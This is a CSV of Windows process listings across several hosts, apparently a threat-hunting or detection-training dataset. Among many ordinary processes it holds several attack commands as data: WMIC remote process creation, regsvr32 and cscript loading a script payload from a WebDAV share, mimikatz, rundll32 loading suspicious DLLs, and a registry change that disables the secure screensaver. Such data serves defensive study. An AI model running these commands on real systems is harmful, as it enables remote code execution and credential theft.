arguments,hostname,name,path,pid,username
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",WE0005OFU,tv_w32.exe,C:\Program Files (x86)\TeamViewer,6249,pheo.cam
C:\Windows\System32\svchost.exe -k secsvcs,WE0005OFU,svchost.exe,C:\Windows\System32,5892,NT AUTHORITY\SYSTEM
"""C:\Users\pheo.cam\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",WE0005OFU,OneDrive.exe,C:\Users\pheo.cam\AppData\Local\Microsoft\OneDrive,1032,pheo.cam
"""C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn\sqlservr.exe"" -sSQLEXPRESS",WE0005OFU,sqlservr.exe,C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn,4085,chlocox26
"""C:\Windows\system32\cmd.exe"" ",WE0005OFU,cmd.exe,C:\Windows\system32,5581,chlocox26
\SystemRoot\System32\smss.exe,WE0005OFU,smss.exe,\SystemRoot\System32,1064,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,WE0005OFU,lsass.exe,C:\Windows\system32,3304,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\Dwm.exe""",WE0005OFU,Dwm.exe,C:\Windows\system32,120,NT AUTHORITY\SYSTEM
"""taskhost.exe""",WE0005OFU,taskhost.exe,C:\Windows\system32,6480,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,WE0005OFU,svchost.exe,C:\Windows\system32,4796,NT AUTHORITY\SYSTEM
"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",WE0005OFU,KeePassXC.exe,C:\Program Files\KeePassXC,5430,pheo.cam
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",WE0005OFU,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,714,pheo.cam
"""C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe"" -ServerName:App.AppX495fygk72hjw82j58ny5h3nr8hpsd8vs.mca",WE0005OFU,Microsoft.Notes.exe,C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe,2646,pheo.cam
\??\C:\Windows\system32\conhost.exe,WE0005OFU,conhost.exe,C:\Windows\system32,2124,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,WE0005OFU,svchost.exe,C:\Windows\system32,1304,NT AUTHORITY\SYSTEM
,WE0005OFU,AvastSvc.exe,,2476,pheo.cam
C:\Windows\system32\lsm.exe,WE0005OFU,lsm.exe,C:\Windows\system32,4736,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",WE0005OFU,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,1690,pheo.cam
"""C:\Windows\system32\wuauclt.exe""",WE0005OFU,wuauclt.exe,C:\Windows\system32,3860,NT AUTHORITY\SYSTEM
wininit.exe,WE0005OFU,wininit.exe,C:\Windows\system32,5068,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,WE0005OFU,spoolsv.exe,C:\Windows\System32,548,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,WE0005OFU,Explorer.EXE,C:\Windows,2348,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,WE0005OFU,svchost.exe,C:\Windows\System32,276,NT AUTHORITY\SYSTEM
C:\Windows\System32\wbem\WMIC.exe /node:NS0000HXE process call create “cmd.exe /c whoami /force”,WE0005OFU,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe,1488,pheo.cam
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",WE0005OFU,reg.exe,C:\Windows\System32\reg.exe,5672,annab.marti
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,WE0005OFU,svchost.exe,C:\Windows\system32,4456,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",WE0005OFU,AvastUI.exe,C:\Program Files\AVAST Software\Avast,5085,pheo.cam
C:\Windows\system32\svchost.exe -k DcomLaunch,WE0005OFU,svchost.exe,C:\Windows\system32,1808,NT AUTHORITY\SYSTEM
"""C:\Users\annab.marti\AppData\Local\slack\app-3.1.1\slack.exe""",WE0005OFU,slack.exe,C:\Users\annab.marti\AppData\Local\slack\app-3.1.1,4758,annab.marti
"""C:\Program Files\Windows Media Player\wmpnetwk.exe""",WE0005OFU,wmpnetwk.exe,C:\Program Files\Windows Media Player,4284,NT AUTHORITY\SYSTEM
"C:\Users\annab.marti\AppData\Local\slack\app-3.1.1\slack.exe --reporter-url=https://slack.com/apps/breakpad?instanceUid=c116fa6f-e78f-4f7e-9927-09567265c493&amp;version=3.1.1&amp;channel=prod --application-name=Slack ""--crashes-directory=C:\Users\annab.marti\AppData\Local\Temp\Slack Crashes"" --v=1",WE0005OFU,slack.exe,C:\Users\annab.marti\AppData\Local\slack\app-3.1.1,1210,annab.marti
C:\Windows\system32\svchost.exe -k netsvcs,WE0005OFU,svchost.exe,C:\Windows\system32,4832,NT AUTHORITY\SYSTEM
C:\Windows\System32\VBoxService.exe,WE0005OFU,VBoxService.exe,C:\Windows\System32,1520,NT AUTHORITY\SYSTEM
C:\Windows\servicing\TrustedInstaller.exe,WE0005OFU,TrustedInstaller.exe,C:\Windows\servicing,3284,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f",WE0005OFU,reg.exe,C:\Windows\System32\reg.exe,2468,annab.marti
C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},WL0003RHG,dllhost.exe,C:\Windows\system32,204,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,WL0003RHG,svchost.exe,C:\Windows\System32,1520,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,WL0003RHG,svchost.exe,C:\Windows\System32,6336,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,WL0003RHG,spoolsv.exe,C:\Windows\System32,4876,NT AUTHORITY\SYSTEM
C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,WL0003RHG,wscript.exe,C:\Windows\System32\wscript.exe,4648,NT AUTHORITY\SYSTEM
C:\Windows\System\mimikatz.exe,WL0003RHG,mimikatz.exe,C:\Windows\System\,3476,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k smbsvcs,WL0003RHG,svchost.exe,C:\Windows\System32,2720,NT AUTHORITY\SYSTEM
"C:\Windows\System32\rundll32.exe C:\Users\emilicarter\Downloads\kernel32.dll,csrsvs",WL0003RHG,rundll32.exe,C:\Windows\System32\rundll32.exe,2136,emilicarter
C:\Windows\Explorer.EXE,WL0003RHG,Explorer.EXE,C:\Windows,4160,NT AUTHORITY\SYSTEM
\??\C:\Windows\system32\conhost.exe 0x4,WL0003RHG,conhost.exe,C:\Windows\system32,1112,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",WL0003RHG,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,3168,lui.carte
C:\Windows\System32\msdtc.exe,WL0003RHG,msdtc.exe,C:\Windows\System32,6472,NT AUTHORITY\SYSTEM
"""dwm.exe""",WL0003RHG,dwm.exe,C:\Windows\system32,6020,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,WL0003RHG,svchost.exe,C:\Windows\system32,3336,NT AUTHORITY\SYSTEM
,WL0003RHG,AvastSvc.exe,,5961,emilicarter
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"" ",WL0003RHG,AcroRd32.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader,2406,lui.carte
C:\Windows\System32\svchost.exe -k termsvcs,WL0003RHG,svchost.exe,C:\Windows\System32,5452,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k netsvcs,WL0003RHG,svchost.exe,C:\Windows\System32,5260,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,WL0003RHG,svchost.exe,C:\Windows\system32,2504,NT AUTHORITY\SYSTEM
winlogon.exe,WL0003RHG,winlogon.exe,C:\Windows\system32,548,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k UnistackSvcGroup,WL0003RHG,svchost.exe,C:\Windows\system32,4112,NT AUTHORITY\SYSTEM
winlogon.exe,WL0003RHG,winlogon.exe,C:\Windows\system32,4972,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,WL0003RHG,svchost.exe,C:\Windows\system32,344,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k DcomLaunch,WL0003RHG,svchost.exe,C:\Windows\system32,6352,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k NetworkService,WL0003RHG,svchost.exe,C:\Windows\system32,4776,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,WL0003RHG,svchost.exe,C:\Windows\system32,840,NT AUTHORITY\SYSTEM
"""C:\Program Files\CyberGhost 6\CyberGhost.Service.exe""",WL0003RHG,CyberGhost.Service.exe,C:\Program Files\CyberGhost 6,1285,emilicarter
"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",WL0003RHG,LogonUI.exe,C:\Windows\system32,3008,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,WL0003RHG,svchost.exe,C:\Windows\system32,3952,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,WL0003RHG,lsass.exe,C:\Windows\system32,4180,NT AUTHORITY\SYSTEM
/loadhooks /Parent:0000000000001188,WL0003RHG,TabTip32.exe,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,1408,NT AUTHORITY\SYSTEM
"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",WL0003RHG,MpCmdRun.exe,C:\Program Files\Windows Defender,2944,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",WL0003RHG,AvastUI.exe,C:\Program Files\AVAST Software\Avast,3443,emilicarter
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",WL0003RHG,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,4447,lui.carte
C:\Windows\System32\RuntimeBroker.exe -Embedding,WL0003RHG,RuntimeBroker.exe,C:\Windows\System32,2148,NT AUTHORITY\SYSTEM
"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",WL0003RHG,KeePassXC.exe,C:\Program Files\KeePassXC,3706,lui.carte
"""C:\Users\emilicarter\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",WL0003RHG,OneDrive.exe,C:\Users\emilicarter\AppData\Local\Microsoft\OneDrive,3669,emilicarter
sihost.exe,WL0003RHG,sihost.exe,C:\Windows\System32,3064,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe""",WL0003RHG,armsvc.exe,C:\Program Files (x86)\Common Files\Adobe\ARM\1.0,4665,lui.carte
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",WL0003RHG,tv_w32.exe,C:\Program Files (x86)\TeamViewer,6016,lui.carte
C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},WL0003RHG,dllhost.exe,C:\Windows\system32,4540,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"" --type=renderer --disable-browser-side-navigation --disable-gpu-compositing --service-pipe-token=49849BA2F50EBF33EAD978C1E9CA6D55 --lang=en-US --disable-pack-loading --lang=en-US --log-file=""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log"" --log-severity=disable --product-version=""ReaderServices/19.8.20071 Chrome/64.0.3282.119"" --enable-pinch --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --enable-gpu-async-worker-context --content-image-texture-target=0 0 3553;0 1 3553;0 2 3553;0 3 3553;0 4 3553;0 5 3553;0 6 3553;0 7 3553;0 8 3553;0 9 3553;0 10 3553;0 11 3553;0 12 3553;0 13 3553;0 14 3553;0 15 3553;0 16 3553;0 17 3553;0 18 3553;1 0 3553;1 1 3553;1 2 3553;1 3 3553;1 4 3553;1 5 3553;1 6 3553;1 7 3553;1 8 3553;1 9 3553;1 10 3553;1 11 3553;1 12 3553;1 13 3553;1 14 3553;1 15 3553;1 16 3553;1 17 3553;1 18 3553;2 0 3553;2 1 3553;2 2 3553;2 3 3553;2 4 3553;2 5 3553;2 6 3553;2 7 3553;2 8 3553;2 9 3553;2 10 3553;2 11 3553;2 12 3553;2 13 3553;2 14 3553;2 15 3553;2 16 3553;2 17 3553;2 18 3553;3 0 3553;3 1 3553;3 2 3553;3 3 3553;3 4 3553;3 5 3553;3 6 3553;3 7 3553;3 8 3553;3 9 3553;3 10 3553;3 11 3553;3 12 3553;3 13 3553;3 14 3553;3 15 3553;3 16 3553;3 17 3553;3 18 3553;4 0 3553;4 1 3553;4 2 3553;4 3 3553;4 4 3553;4 5 3553;4 6 3553;4 7 3553;4 8 3553;4 9 3553;4 10 3553;4 11 3553;4 12 3553;4 13 3553;4 14 3553;4 15 3553;4 16 3553;4 17 3553;4 18 3553;5 0 3553;5 1 3553;5 2 3553;5 3 3553;5 4 3553;5 5 3553;5 6 3553;5 7 3553;5 8 3553;5 9 3553;5 10 3553;5 11 3553;5 12 3553;5 13 3553;5 14 3553;5 15 3553;5 16 3553;5 17 3553;5 18 3553;6 0 3553;6 1 3553;6 2 3553;6 3 3553;6 4 3553;6 5 3553;6 6 3553;6 7 3553;6 8 3553;6 9 3553;6 10 3553;6 11 3553;6 12 3553;6 13 3553;6 14 3553;6 15 3553;6 16 3553;6 17 3553;6 18 3553 --disable-accelerated-video-decode --service-request-channel-token=49849BA2F50EBF33EAD978C1E9CA6D55 --renderer-client-id=4 --mojo-platform-channel-handle=2328 --allow-no-sandbox-job /prefetch:1",WL0003RHG,RdrCEF.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF,3079,lui.carte
"""C:\Program Files\internet explorer\iexplore.exe"" ",WL0003RHG,iexplore.exe,C:\Program Files\internet explorer,2243,emilicarter
"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",WL0003RHG,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,5944,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",WL0003RHG,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,564,NT AUTHORITY\SYSTEM
"""dwm.exe""",WL0003RHG,dwm.exe,C:\Windows\system32,5664,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc,WL0003RHG,svchost.exe,C:\Windows\System32,3124,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"" --backgroundcolor=16514043",WL0003RHG,RdrCEF.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF,5420,lui.carte
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"" --type=renderer /prefetch:1",WL0003RHG,AcroRd32.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader,3534,lui.carte
C:\Windows\System32\svchost.exe -k LocalService,WL0003RHG,svchost.exe,C:\Windows\System32\svchost.exe,720,emilicarter
"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" ",WL0003RHG,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,1881,emilicarter
C:\Windows\system32\svchost.exe -k appmodel,WL0003RHG,svchost.exe,C:\Windows\system32,5064,NT AUTHORITY\SYSTEM
taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},WL0003RHG,taskhostw.exe,C:\Windows\System32,4212,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k RPCSS,WL0003RHG,svchost.exe,C:\Windows\system32,6028,NT AUTHORITY\SYSTEM
"""dwm.exe""",WL0003RYA,dwm.exe,C:\Windows\system32,5008,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,WL0003RYA,svchost.exe,C:\Windows\System32,2132,NT AUTHORITY\SYSTEM
\??\C:\Windows\system32\conhost.exe 0x4,WL0003RYA,conhost.exe,C:\Windows\system32,3548,NT AUTHORITY\SYSTEM
"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",WL0003RYA,MpCmdRun.exe,C:\Program Files\Windows Defender,2112,NT AUTHORITY\SYSTEM
winlogon.exe,WL0003RYA,winlogon.exe,C:\Windows\system32,3216,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc,WL0003RYA,svchost.exe,C:\Windows\System32,564,NT AUTHORITY\SYSTEM
sihost.exe,WL0003RYA,sihost.exe,C:\Windows\System32,528,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",WL0003RYA,iexplore.exe,C:\Program Files\internet explorer,3505,isai.bel
C:\Windows\Explorer.EXE,WL0003RYA,Explorer.EXE,C:\Windows,560,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,WL0003RYA,svchost.exe,C:\Windows\system32,3084,NT AUTHORITY\SYSTEM
C:\Windows\System32\RuntimeBroker.exe -Embedding,WL0003RYA,RuntimeBroker.exe,C:\Windows\System32,2460,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k termsvcs,WL0003RYA,svchost.exe,C:\Windows\System32,812,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,WL0003RYA,lsass.exe,C:\Windows\system32,2568,NT AUTHORITY\SYSTEM
"""dwm.exe""",WL0003RYA,dwm.exe,C:\Windows\system32,152,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",WL0003RYA,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,2424,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k DcomLaunch,WL0003RYA,svchost.exe,C:\Windows\system32,1012,NT AUTHORITY\SYSTEM
C:\Windows\System32\cscript //E:jscript \webdavserver\folder\ctfmons.txt,WL0003RYA,cscript.exe,C:\Windows\System32\cscript.exe,4612,victoria.bell
C:\Windows\system32\svchost.exe -k RPCSS,WL0003RYA,svchost.exe,C:\Windows\system32,4872,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",WL0003RYA,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,3664,NT AUTHORITY\SYSTEM
C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},WL0003RYA,dllhost.exe,C:\Windows\system32,1776,NT AUTHORITY\SYSTEM
C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},WL0003RYA,dllhost.exe,C:\Windows\system32,4844,NT AUTHORITY\SYSTEM
,WL0003RYA,AvastSvc.exe,,5634,victoria.bell
C:\Windows\System32\svchost.exe -k netsvcs,WL0003RYA,svchost.exe,C:\Windows\System32,3788,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,WL0003RYA,spoolsv.exe,C:\Windows\System32,2688,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",WL0003RYA,AvastUI.exe,C:\Program Files\AVAST Software\Avast,946,victoria.bell
"""C:\Ruby24-x64\bin\ruby.exe"" ",WL0003RYA,ruby.exe,C:\Ruby24-x64\bin,836,ann.mar3
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",WL0003RYA,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,5335,victoria.bell
C:\Windows\system32\svchost.exe -k LocalService,WL0003RYA,svchost.exe,C:\Windows\system32,6424,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,WL0003RYA,svchost.exe,C:\Windows\system32,1640,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k smbsvcs,WL0003RYA,svchost.exe,C:\Windows\System32,5368,NT AUTHORITY\SYSTEM
"""C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe"" -ServerName:SkypeBackgroundHost",WL0003RYA,SkypeBackgroundHost.exe,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c,991,isai.bel
C:\Windows\system32\svchost.exe -k appmodel,WL0003RYA,svchost.exe,C:\Windows\system32,5612,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,WL0003RYA,svchost.exe,C:\Windows\system32,2440,NT AUTHORITY\SYSTEM
"C:\Windows\System32\rundll32.exe C:\Users\victoria.bell\Documents\winrnr.dll,7gwn77",WL0003RYA,rundll32.exe,C:\Windows\System32\rundll32.exe,3988,isai.bel
"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",WL0003RYA,LogonUI.exe,C:\Windows\system32,2800,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k NetworkService,WL0003RYA,svchost.exe,C:\Windows\system32,1052,NT AUTHORITY\SYSTEM
"""C:\Users\ann.mar3\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",WL0003RYA,OneDrive.exe,C:\Users\ann.mar3\AppData\Local\Microsoft\OneDrive,2715,ann.mar3
C:\Windows\System32\msdtc.exe,WL0003RYA,msdtc.exe,C:\Windows\System32,6464,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=renderer --field-trial-handle=1556 1270622256617353588 15561965010207222735 131072 --service-pipe-token=1352282089870284743 --lang=en-US --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --service-request-channel-token=1352282089870284743 --renderer-client-id=45 --mojo-platform-channel-handle=7884 /prefetch:1",WL0003RYA,chrome.exe,C:\Program Files (x86)\Google\Chrome\Application,890,ann.mar3
C:\Windows\system32\svchost.exe -k UnistackSvcGroup,WL0003RYA,svchost.exe,C:\Windows\system32,3196,NT AUTHORITY\SYSTEM
taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},WL0003RYA,taskhostw.exe,C:\Windows\System32,6496,NT AUTHORITY\SYSTEM
"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,WL0003RYA,cmd.exe,C:\WINDOWS\system32,1008,ann.mar3
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",WL0003RYA,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,3414,isai.bel
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",WL0003RYA,tv_w32.exe,C:\Program Files (x86)\TeamViewer,4114,victoria.bell
C:\Windows\System32\svchost.exe -k netsvcs,WL0003RYA,svchost.exe,C:\Windows\System32\svchost.exe,3644,isai.bel
winlogon.exe,WL0003RYA,winlogon.exe,C:\Windows\system32,5240,NT AUTHORITY\SYSTEM
/loadhooks /Parent:0000000000001188,WL0003RYA,TabTip32.exe,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,1612,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",WL0003RYA,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,2516,victoria.bell
C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,WL0003RYA,svchost.exe,C:\Windows\system32,2056,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,WL0003RYA,svchost.exe,C:\Windows\System32,1816,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",WL0005OFU,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,6408,pheo.cam
C:\Windows\System32\spoolsv.exe,WL0005OFU,spoolsv.exe,C:\Windows\System32,2440,NT AUTHORITY\SYSTEM
%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024 20480 768 Windows=On SubSystemType=Windows ServerDll=basesrv 1 ServerDll=winsrv:UserServerDllInitialization 3 ServerDll=winsrv:ConServerDllInitialization 2 ServerDll=sxssrv 4 ProfileControl=Off MaxRequestThreads=16,WL0005OFU,csrss.exe,C:\Windows\system32,5812,NT AUTHORITY\SYSTEM
"""taskhost.exe""",WL0005OFU,taskhost.exe,C:\Windows\system32,3908,NT AUTHORITY\SYSTEM
"""C:\Users\pheo.cam\AppData\Local\slack\app-3.1.1\slack.exe""",WL0005OFU,slack.exe,C:\Users\pheo.cam\AppData\Local\slack\app-3.1.1,4363,pheo.cam
